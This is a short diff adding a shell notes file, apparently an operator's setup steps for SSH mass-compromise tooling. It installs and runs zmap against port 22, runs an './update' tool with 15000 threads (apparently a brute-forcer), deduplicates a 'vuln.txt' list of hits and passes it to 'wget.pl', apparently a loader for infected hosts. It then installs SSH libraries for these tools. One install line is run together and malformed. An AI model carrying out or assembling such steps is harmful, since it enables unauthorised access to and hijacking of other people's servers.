@@ -1,0 +1,25 @@
+apt-get install perl -y
+
+./zmap_auto_install.sh
+
+zmap -p 22 -w "list" -o mfu.txt -B10M
+
+chmod 777 *
+
+./update 15000
+
+cat vuln.txt | sort | uniq > nodupes.txt
+
+perl wget.pl nodupes.txt
+
+# fix
+
+yum install gcc cpan php-pear php-devel libssh2 libssh2-devel -y
+
+pecl install -f ssh2 touch /etc/php.d/ssh2.ini echo
+
+extension=ssh2.so>/etc/php.d/ssh2.ini
+
+cpan -fi Net::SSH2
+
+cpan -fi Parallel::ForkManager
